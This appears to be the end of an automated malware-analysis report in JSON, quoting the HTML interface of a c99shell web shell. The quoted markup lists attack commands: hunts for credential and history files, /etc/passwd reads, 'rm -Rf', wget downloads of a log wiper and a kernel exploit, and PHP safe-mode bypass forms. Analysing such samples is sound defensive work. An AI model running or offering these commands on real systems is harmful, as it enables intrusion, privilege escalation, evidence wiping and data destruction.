            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0157 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://google.com/search",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"
        ]
    },
    "time": "0:00:14.667424",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
